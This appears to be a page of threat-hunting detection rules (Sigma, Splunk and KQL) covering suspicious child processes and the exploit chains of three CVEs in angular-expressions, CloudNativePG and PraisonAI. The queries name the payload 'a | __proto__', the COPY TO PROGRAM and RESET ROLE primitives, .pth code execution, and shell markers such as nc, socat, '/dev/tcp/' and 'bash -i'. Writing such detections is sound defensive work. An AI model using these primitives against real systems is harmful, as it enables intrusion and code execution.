description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process

[LLM] Angular-expressions sandbox-escape payload in web request URI or body Exploitation Medium
Hunts for the CVE-2026-44643 sandbox-escape signature — angular-expressions filter syntax referencing `__proto__`, `constructor`, or `prototype` — appearing in HTTP request URI/query strings or POST bodies hitting Node.js front-ends. The literal payload from the GHSA PoC is `a | __proto__`; the pipe-into-property-name shape is highly atypical of normal client traffic. Rationale: The GHSA PoC string `a | __proto__` is the only article-grounded literal we have; the pipe-into-`__proto__`/`constructor`/`prototype` filter shape is the article-specific exploitation signature. Web/WAF logs are the natural choke point because the payload must traverse HTTP to reach the vulnerable server-side `expressions.compile()` call. URL-encoded variants (`%7C`) are included because clients/proxies routinely percent-encode the pipe character. Cross-checked against: • https://github.com/advisories/GHSA-pw8r-6689-xvf4 • https://nvd.nist.gov/vuln/detail/CVE-2026-44643
ATT&CKT1190 T1059.007
Data sourcesWeb.Web
// Best-effort hunt on Defender: the angular-expressions exploit traverses through HTTP, which Defender does not ingest directly. Pivot on outbound URLs containing the payload signature where a Node.js process initiated the request (callback / SSRF-style chain).
let Lookback = 7d;
DeviceNetworkEvents
| where Timestamp > ago(Lookback)
| where isnotempty(RemoteUrl)
| where RemoteUrl has_any ("|__proto__", "%7C__proto__", "|constructor", "%7Cconstructor", "|prototype", "%7Cprototype")
| where InitiatingProcessFileName in~ ("node.exe", "nodejs.exe", "electron.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc

let Lookback = 7d;

[LLM] Node.js runtime spawning OS shell or LOLBin (post-exploit RCE from angular-expressions) Exploitation High
Hunts the post-exploitation tell of CVE-2026-44643: an angular-expressions sandbox escape culminates in arbitrary code execution inside the Node.js process, which on Windows typically materialises as `node.exe` (or `electron.exe`) spawning `cmd.exe`, `powershell.exe`, `wscript.exe`, or other LOLBins. On Linux this surfaces as `node` spawning `/bin/sh`, `/bin/bash`, `curl`, `wget`, or `python`. Legitimate Node applications rarely shell out at runtime, so the parent→child pair is a high-fidelity post-exploitation signal independent of any specific payload string. Rationale: CVE-2026-44643 culminates in arbitrary code execution inside the Node.js process; the highest-fidelity post-exploit pivot is the unusual parent→child shape `node.exe → cmd/powershell/sh/curl`. This is independent of the specific payload string and catches operators who get past WAF URI matching. The `npm-cli.js`/`node-gyp`/`husky` filter removes the dominant benign FP class (build tooling and dev installs). Cross-checked against: • https://github.com/advisories/GHSA-pw8r-6689-xvf4 • https://nvd.nist.gov/vuln/detail/CVE-2026-44643 • https://attack.mitre.org/techniques/T1190/
ATT&CKT1190 T1059.001 T1059.003 T1059.004

[LLM] CloudNativePG metrics-exporter exploit: COPY TO PROGRAM or RESET ROLE in postgres scrape session Exploitation High
Hunts CVE-2026-44477 exploitation by looking for the SQL primitives that recover superuser identity (RESET ROLE / RESET SESSION AUTHORIZATION) or spawn OS subprocesses (COPY ... TO PROGRAM) inside the metrics exporter's scrape session, or for shadow-function planting on catalog identifiers used by default-monitoring.yaml such as current_database(). All three are diagnostic of the published exploit chain and are absent from any legitimate CNPG monitoring workload. Rationale: Anchors on the three exact SQL primitives the GHSA names as the exploit chain (RESET ROLE / RESET SESSION AUTHORIZATION to recover superuser, COPY ... TO PROGRAM to spawn the OS subprocess) plus shadow-function creation targeting current_database() — the specific Path-2 vector against default-monitoring.yaml. Scoping to the postgres user / metrics-exporter application_name eliminates DBA noise. Cross-checked against: • https://github.com/advisories/GHSA-423p-g724-fr39
ATT&CKT1190 T1068 T1059 T1574
Data sourcesApplication_State.All_Application_State
// PostgreSQL logs from CloudNativePG primary pods, shipped via Container Insights Syslog forwarder.
// Searches for CVE-2026-44477 exploitation primitives in scrape-session SQL.
let exploit_strings = dynamic([
    "COPY",                       // pair with "TO PROGRAM" below for specificity
    "RESET ROLE",
    "RESET SESSION AUTHORIZATION",
    "CREATE OR REPLACE FUNCTION",
    "CREATE FUNCTION"
]);
Syslog
| where TimeGenerated > ago(7d)
| where ProcessName has_any ("postgres", "postmaster") or SyslogMessage has "cnpg"
| where SyslogMessage has_any (exploit_strings)
// require the high-fidelity tail-strings — RESET ROLE alone is rare but real DBA usage
| where SyslogMessage matches regex @"(?i)COPY\s+.*\s+TO\s+PROGRAM\b"
     or SyslogMessage matches regex @"(?i)\bRESET\s+(SESSION\s+AUTHORIZATION|ROLE)\b"
     or SyslogMessage matches regex @"(?i)CREATE\s+(OR\s+REPLACE\s+)?FUNCTION\s+\w*\.?(current_database|current_schema|version|now)\s*\("
| extend pg_user = extract(@"(?i)user=([^,\s]+)", 1, SyslogMessage),
         pg_db   = extract(@"(?i)db=([^,\s]+)", 1, SyslogMessage),
         app     = extract(@"(?i)application_name=([^,\s]+)", 1, SyslogMessage)
| project TimeGenerated, Computer, HostIP, ProcessName, pg_user, pg_db, app, SyslogMessage
| order by TimeGenerated desc

[LLM] OS subprocess spawned by postgres backend inside CNPG primary pod Installation High
Catches the RCE outcome of CVE-2026-44477 — COPY ... TO PROGRAM spawning a non-postgres child (sh, bash, curl, wget, python, busybox, nc) under the postgres OS user inside the CloudNativePG primary container. Legitimate CNPG pods spawn an extremely narrow set of children from the postgres backend, so a shell or download tool is high-fidelity. Rationale: The article is explicit: COPY ... TO PROGRAM spawns an OS-level subprocess as the postgres user inside the primary pod. Legitimate CNPG postgres backends spawn essentially nothing except internal postgres workers and archive_command processes — a shell, curl/wget, or scripting interpreter as a postgres child is the highest-fidelity post-exploitation signal available regardless of whether PG-audit logging is enabled. Cross-checked against: • https://github.com/advisories/GHSA-423p-g724-fr39
ATT&CKT1059.004 T1068 T1610
Data sourcesEndpoint.Processes
// Defender for Endpoint on Linux / Defender for Cloud Containers feeding DeviceProcessEvents.
// CVE-2026-44477 RCE outcome: postgres backend spawning shell/network tool inside CNPG pod.
let susp_children = dynamic([
    "sh","bash","dash","ash","busybox","nc","ncat","socat",
    "curl","wget","python","python3","perl","ruby","php"
]);
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName =~ "postgres"
| where InitiatingProcessFileName in~ ("postgres","postmaster")
     or InitiatingProcessFolderPath endswith "/postgres"
     or InitiatingProcessFolderPath endswith "/postmaster"
| where FileName in~ (susp_children)
     or ProcessCommandLine has_any (" -c ","curl ","wget ","/dev/tcp/","bash -i","sh -i")
| project Timestamp, DeviceName, AccountName, AccountDomain,
          Parent      = InitiatingProcessFileName,
          ParentPath  = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          Child       = FileName,
          ChildPath   = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc

[LLM] Python .pth file written into site-packages by non-installer (PraisonAI MCP RCE chain) Installation High
Detects the RCE-escalation step in CVE-2026-44336: an arbitrary file write that drops a Python .pth file into a site-packages / dist-packages directory. CPython's site.py auto-executes import lines from every .pth at interpreter startup, so this primitive turns any path-traversal write into code execution on the next Python process. Filtered to non-installer initiators because legitimate .pth writes virtually only come from pip / poetry / wheel. Rationale: .pth files dropped into site-packages are the documented RCE primitive from the GHSA advisory (Section 5, Code-execution escalation via Python .pth). Filtering on `.pth` + `site-packages` + non-installer initiator is high-fidelity because legitimate .pth writes are virtually monopolised by pip / setuptools / poetry. PoC marker filenames `praisonai_chain_a_rce.pth` and `PRAISONAI_PWNED.txt` from the article's verified PoC are caught by the .pth file-extension predicate. Cross-checked against: • https://github.com/advisories/GHSA-9mqq-jqxf-grvw
ATT&CKT1574 T1546
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType == "FileCreated"
| where FileName endswith ".pth"
| where FolderPath has_any (@"\site-packages\", @"/site-packages/", @"/dist-packages/")
| where InitiatingProcessFileName !in~ ("pip.exe","pip3.exe","pip3.13.exe","poetry.exe","conda.exe","msiexec.exe","setup.exe")
| where not(InitiatingProcessCommandLine has_any ("pip install","pip3 install","setup.py install","pip.__main__","wheel install","poetry install","conda install"))
| where not(InitiatingProcessFolderPath has_any (@"\pip\", @"\setuptools\", @"\poetry\"))
| project Timestamp, DeviceName, InitiatingProcessAccountName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(7d)
| where EventType == "FileCreated"
| where TargetFileName endswith ".pth"
| where TargetFilePath has_any (@"\site-packages\", @"/site-packages/", @"/dist-packages/")
| where ActingProcessName !endswith "pip.exe" and ActingProcessName !endswith "pip3.exe" and ActingProcessName !endswith "poetry.exe" and ActingProcessName !endswith "conda.exe" and ActingProcessName !endswith "msiexec.exe"
| where not(ActingProcessCommandLine has_any ("pip install","pip3 install","setup.py install","poetry install","wheel install","conda install","pip.__main__"))
| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, TargetFileName, ActingProcessName, ActingProcessCommandLine
